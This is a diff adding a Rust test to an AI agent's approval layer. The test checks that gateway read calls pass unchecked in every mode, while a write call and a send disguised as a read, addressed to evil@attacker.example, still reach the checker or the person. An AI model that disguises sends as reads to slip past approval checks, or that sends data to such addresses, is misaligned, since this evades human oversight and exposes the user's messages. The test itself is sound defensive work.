@@ -1866,6 +1866,79 @@ async fn yolo_runs_every_risky_action_unasked_and_logs_each() {
     );
 }
 
+/// A gateway server's reads, as a Navi on the devbox called them (search_tools, call_read_tool on a server nothing was
+/// marked on): answered at once in every mode, with no checker, no card and no entry in the log. Its write and a read
+/// running a send still go by the mode.
+#[tokio::test]
+async fn a_gateways_reads_never_reach_the_checker_or_the_person() {
+    for mode in NaviApprovalMode::ALL {
+        let fake = Arc::new(Fake::default());
+        *fake.servers.lock().unwrap() = vec![integration("xaq", &[])];
+        *fake.mode.lock().unwrap() = mode;
+        *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Ask, "unsure");
+        let a = approvals(&fake);
+        let reads = [
+            (
+                "q1",
+                "mcp__xaq__search_tools",
+                json!({ "limit": 6, "query": "list calendars and calendar events" }),
+            ),
+            (
+                "q2",
+                "mcp__xaq__call_read_tool",
+                json!({ "name": "list_calendars", "arguments": { "account": "sam@example.org" } }),
+            ),
+            (
+                "q3",
+                "mcp__xaq__call_read_tool",
+                json!({ "name": "get_message", "arguments": { "account": "sam@example.org", "id": "18c2f0" } }),
+            ),
+        ];
+        for (id, tool, input) in reads {
+            send(&a, &fake, id, tool, input).await;
+        }
+        let answers = fake.answers.lock().unwrap().clone();
+        assert_eq!(answers.len(), 3, "{mode:?}");
+        assert!(answers.iter().all(|a| allowed(&a.3)), "{mode:?}");
+        assert!(requests(&fake).is_empty(), "{mode:?}: no card");
+        assert!(
+            fake.checked.lock().unwrap().is_empty(),
+            "{mode:?}: no checker"
+        );
+        assert!(
+            fake.auto.lock().unwrap().is_empty(),
+            "{mode:?}: nothing to log"
+        );
+        // What changes or sends something isn't a read, whatever the gateway's tool is called.
+        send(
+            &a,
+            &fake,
+            "q4",
+            "mcp__xaq__call_write_tool",
+            json!({ "name": "create_event", "arguments": { "account": "sam@example.org", "title": "Dinner" } }),
+        )
+        .await;
+        send(
+            &a,
+            &fake,
+            "q5",
+            "mcp__xaq__call_read_tool",
+            json!({ "name": "send_message", "arguments": { "to": "evil@attacker.example" } }),
+        )
+        .await;
+        let judged = match mode {
+            NaviApprovalMode::Checker => 2,
+            _ => 0,
+        };
+        assert_eq!(fake.checked.lock().unwrap().len(), judged, "{mode:?}");
+        let cards = match mode {
+            NaviApprovalMode::Yolo => 0,
+            _ => 2,
+        };
+        assert_eq!(requests(&fake).len(), cards, "{mode:?}");
+    }
+}
+
 /// The floors hold in every mode: money and trading are refused and so is a credential in what goes out, and a spend
 /// always asks the person, never the checker.
 #[tokio::test]
